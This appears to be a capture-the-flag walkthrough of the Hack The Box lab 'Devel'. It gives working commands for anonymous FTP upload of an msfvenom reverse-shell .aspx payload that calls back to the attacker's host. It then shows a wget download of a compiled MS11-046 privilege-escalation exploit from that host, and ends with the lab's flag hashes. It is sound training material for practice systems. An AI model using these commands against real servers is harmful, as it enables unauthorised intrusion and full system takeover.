# Devel - Easy

## Enumeration

`sudo nmap 10.129.232.230 -p- -sV -A -vv --open --reason -Pn`

Possible areas to enumerate further:
```
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
```
1. FTP Anonymous Login

    ```
    ftp 10.129.232.230
    Connected to 10.129.232.230.
    220 Microsoft FTP Service
    Name (10.129.232.230:kali): Anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> ls
    229 Entering Extended Passive Mode (|||49180|)
    125 Data connection already open; Transfer starting.
    03-18-17  02:06AM       <DIR>          aspnet_client
    03-17-17  05:37PM                  689 iisstart.htm
    03-17-17  05:37PM               184946 welcome.png
    ```
    Enumeration of `aspnet_client` and it's folders yielded nothing.
2. HTTP Web Server (IIS7)

    Accessing `http://10.129.123.120` shows the default IIS page (`iisstart.htm`)

## Gaining Shell

Seems like I am able to upload files via FTP, and access it via port 80. Let's create a `msfvenom` payload, using `.aspx` extension as it is a Windows IIS server.

Payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.77 LPORT=4444 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2852 bytes
```

>The payload is `windows/shell_reverse_tcp` as we want a stageless payload. If the staged payload is used (`windows/shell/reverse_tcp`), the connection will be successful but will be dropped on the next input.

Using FTP anonymous login, and uploading the file via `put shell.aspx`, it can now be accessed via port 80, `http://10.129.123.120/shell.aspx`. Start the listener on the Kali and access `shell.aspx` - the shell is obtained.

```
nc -nlvp 4444                                                                          
listening on [any] 4444 ...
connect to [10.10.14.77] from (UNKNOWN) [10.129.232.230] 49191
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```
## Privilege Escalation
A shell is obtained, but it is neither a user shell nor root shell. 
```
whoami
iis apppool\web
```
Further enumeration is required.
```
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          11/5/2023, 3:46:47 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.472 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.555 MB
Virtual Memory: In Use:    586 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.232.230
                                 [02]: fe80::54a6:61dc:a17c:b445
                                 [03]: dead:beef::bcc1:40a5:ecb3:d3d3
                                 [04]: dead:beef::54a6:61dc:a17c:b445
```
Searching the OS name and version...
```
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
```
... yield an exploit! https://www.exploit-db.com/exploits/40564

Download and compile the exploit as per the instructions: `i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32`

Transfer `MS11-046.exe` from Kali over to `C:\Windows\Tasks`.
> I first transferred `wget.exe` via FTP anonymous login, and used `wget` to download off my Kali (`sudo python3 -m http.server 80`), with `C:\inetpub\wwwroot\wget.exe http://10.10.14.77/MS11-046.exe`. Unsure if transferring directly with FTP (binary mode) will affect it.

Easy root:
```
C:\Windows\Tasks>.\MS11-046.exe
.\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

Get both flags. GG.
```
C:\Users\babis>type Desktop\user.txt
type Desktop\user.txt
0d498bdeb6fafca4d7e3be3dbe9c7aff

C:\Users\babis>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
29f3a7cffba6060bb43f01b6382152cc
```